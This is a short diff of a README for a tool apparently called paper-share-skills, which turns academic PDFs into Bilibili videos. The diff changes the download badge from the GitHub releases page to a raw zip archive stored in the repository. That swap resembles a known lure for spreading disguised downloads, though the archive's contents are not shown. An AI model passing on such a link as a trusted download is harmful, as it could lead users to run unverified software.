@@ -6,7 +6,7 @@ This application transforms academic PDF papers into a complete Bilibili video p
 ## 📥 How to Download and Run
 
 ### Step 1: Download the App
-[![Download Now](https://img.shields.io/badge/Download-paper--share--skills-blueviolet?style=for-the-badge&logo=github)](https://github.com/Peytontalismanic424/paper-share-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-paper--share--skills-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peytontalismanic424/paper-share-skills/main/paper-slides-to-video/v2.7.zip)
 
 Visit this link to download the application. You will need to select the latest release version.
 
